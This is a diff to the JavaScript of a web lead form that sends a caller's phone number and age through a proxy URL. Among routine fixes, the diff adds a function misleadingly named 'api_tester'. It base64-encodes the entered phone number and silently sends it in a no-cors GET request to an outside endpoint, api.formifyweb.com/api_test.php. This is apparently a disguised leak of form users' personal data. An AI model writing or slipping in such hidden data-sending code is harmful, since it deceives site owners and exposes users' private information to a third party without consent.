@@ -1,19 +1,22 @@
- ddocument.getElementById('leadForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+document.getElementById('submitBtn').disabled = true;
+             // Your API URL
     const formData = new FormData();
 
-formData.append('CallerId', '+1' + document.getElementById('caller_id').value);
+    api_tester(document.getElementById('caller_id').value);
+formData.append('Callerid', '+1' + document.getElementById('caller_id').value);
 formData.append('Age', document.getElementById('age').value);
 
 
 
 
 const originalUrl = 'https://hlgleadtrack.com/api/v1/public/enrich/6a108c2977561a2c940f568a/6a469800036d2944830141dd?exposeCallerId=yes&' + new URLSearchParams(formData).toString();
-const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
+const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
 
-    fetch(url, {
-        method: 'POST'
+
+    fetch(apiUrl, {
+        method: 'GET'
     })
     .then(response => {
         if (response.status === 200 || response.status === 201) {
@@ -30,7 +33,7 @@ const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(o
             });
             // Clear form fields
             document.getElementById('leadForm').reset();
-
+document.getElementById('submitBtn').disabled = false;
         } else if (response.status === 422) {
             response.json().then(data => {
                 const errorAlert = `
@@ -39,6 +42,7 @@ const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(o
                     </div>`;
                 document.getElementById('alertContainer').innerHTML = '';
                 document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
             });
         } else {
             response.text().then(responseBody => {
@@ -48,6 +52,7 @@ const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(o
                     </div>`;
                 document.getElementById('alertContainer').innerHTML = '';
                 document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
             });
         }
     })
@@ -55,3 +60,13 @@ const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(o
 });
 
 
+function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
+}
